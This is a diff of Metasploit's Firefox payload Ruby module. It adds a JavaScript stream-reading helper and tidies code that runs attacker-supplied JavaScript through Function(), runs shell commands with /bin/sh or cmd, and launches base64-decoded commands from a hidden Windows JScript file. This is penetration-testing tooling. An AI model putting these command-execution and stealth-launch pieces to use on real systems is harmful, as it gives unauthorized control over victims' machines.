@@ -4,7 +4,6 @@ require 'json'
 
 module Msf::Payload::Firefox
 
-
   # Javascript source code of setTimeout(fn, delay)
   # @return [String] javascript source code that exposes the setTimeout(fn, delay) method
   def set_timeout_source
@@ -13,6 +12,37 @@ module Msf::Payload::Firefox
         var timer = Components.classes["@mozilla.org/timer;1"].createInstance(Components.interfaces.nsITimer);
         timer.initWithCallback({notify:cb}, delay, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
         return timer;
+      };
+    |
+  end
+
+  # Javascript source of readUntilToken(s)
+  # Continues reading the stream as data is available, until a pair of
+  #   command tokens like [[aBcD123ffh]] [[aBcD123ffh]] is consumed.
+  #
+  # Returns a function that can be passed to the #onDataAvailable callback of
+  #   nsIInputStreamPump that will buffer until a second token is read, or, in
+  #   the absence of any tokens, a newline character is read.
+  #
+  # @return [String] javascript source code that exposes the readUntilToken(cb) function
+  def read_until_token_source
+    %Q|
+      var readUntilToken = function(cb) {
+        Components.utils.import("resource://gre/modules/NetUtil.jsm");
+
+        var buffer = '', m = null;
+        return function(request, context, stream, offset, count) {
+          buffer += NetUtil.readInputStreamToString(stream, count);
+          if (buffer.match(/^(\\[\\[\\w{8}\\]\\])/)) {
+            if (m = buffer.match(/^(\\[\\[\\w{8}\\]\\])([\\s\\S]*)\\1/)) {
+              cb(m[2]);
+              buffer = '';
+            }
+          } else if (buffer.indexOf("\\n") > -1) {
+            cb(buffer);
+            buffer = '';
+          }
+        };
       };
     |
   end
@@ -86,14 +116,14 @@ module Msf::Payload::Firefox
         var js = (/^\\s*\\[JAVASCRIPT\\]([\\s\\S]*)\\[\\/JAVASCRIPT\\]/g).exec(cmd.trim());
         if (js) {
           var tag = "[!JAVASCRIPT]";
-          var sync = true;  // avoid zalgo's reach
+          var sync = true;  /* avoid zalgo's reach */
           var sent = false;
           var retVal = null;
 
           try {
             retVal = Function('send', js[1])(function(r){
               if (sent) return;
-              sent = true
+              sent = true;
               if (r) {
                 if (sync) setTimeout(function(){ cb(false, r+tag+"\\n"); });
                 else      cb(false, r+tag+"\\n");
@@ -112,7 +142,7 @@ module Msf::Payload::Firefox
         }
 
         var shEsc = "\\\\$&";
-        var shPath = "/bin/sh -c"
+        var shPath = "/bin/sh -c";
 
         if (windows) {
           shPath = "cmd /c";
@@ -173,6 +203,8 @@ module Msf::Payload::Firefox
   # This file is dropped on the windows platforms to a temp file in order to prevent the
   # cmd.exe prompt from appearing. It is executed and then deleted.
   #
+  # Note: we should totally add a powershell replacement here.
+  #
   # @return [String] JScript that reads its command-line argument, decodes
   # base64 and runs it as a shell command.
   def jscript_launcher
@@ -188,4 +220,5 @@ module Msf::Payload::Firefox
       (new ActiveXObject("WScript.Shell")).Run(cmd, 0, true);
     |
   end
+
 end
